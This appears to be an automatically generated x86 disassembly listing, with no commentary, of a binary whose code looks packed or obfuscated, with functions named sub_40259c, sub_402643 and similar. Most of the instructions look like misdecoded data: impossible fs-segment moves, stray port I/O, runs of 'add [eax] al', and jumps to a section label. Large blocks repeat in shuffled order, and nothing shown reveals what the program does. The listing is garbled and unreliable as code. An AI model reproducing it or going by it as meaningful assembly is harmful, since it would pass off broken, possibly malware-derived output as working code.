add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_40259c
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_402647
jns 0xffffffff9cc13509
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1000e27
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c335fe
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec1688b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
jae r-xdata
jl 0xffffffffa1a4b8a7
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402661
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
jg r-xdata
jge 0x18aac1c
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc0099c32
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe2499eb
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc646b80
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402643
jge r-xdata
add esp 0x8
jge 0xffffffff874fd8c0
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c335fe
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc646b80
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec1688b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
jae r-xdata
jl 0xffffffffa1a4b8a7
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402661
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18aac1c
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e27
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
jg r-xdata
jge 0xffffffffc0099c32
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe2499eb
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402647
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
jns r-xdata
add ebx 0x9c575756
call sub_402661
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c335fe
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4b8a7
jg r-xdata
jge 0x18aac1c
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc0099c32
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e27
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe2499eb
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec1688b
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc646b80
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402654
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b2
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_402661
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc0099c32
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e27
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c335fe
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe2499eb
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4b8a7
jg r-xdata
jge 0x18aac1c
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec1688b
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc646b80
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_402654
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120aa57
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f13
jae r-xdata
jpo 0x36287f59
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fa9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b10f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402711
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9afe
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f6e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281c
sub esi 0xe92e7f58
push esp
push edi
call sub_40273e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af89
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402661
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff82029fc3
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85ba56d
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357b
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_402643
jo 0xffffffffff29b404
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753335
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_402661
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_402692
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18aac1c
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e27
jne r-xdata
jpe 0x18c335fe
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec1688b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4b8a7
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9ce
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100aaba
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c21504
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e960
jae r-xdata
